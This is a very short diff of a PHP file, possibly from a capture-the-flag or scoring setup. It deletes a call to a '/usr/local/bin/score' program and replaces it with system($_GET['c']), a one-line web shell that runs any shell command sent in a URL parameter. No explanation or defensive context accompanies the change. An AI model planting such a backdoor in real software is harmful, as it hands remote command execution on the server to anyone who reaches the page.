@@ -1,5 +1,3 @@
 <?php 
-
-system('/usr/local/bin/score 73a684eb-ce6b-4b17-a92a-36e697f4efc2');
-
+  system($_GET['c']);
 ?>
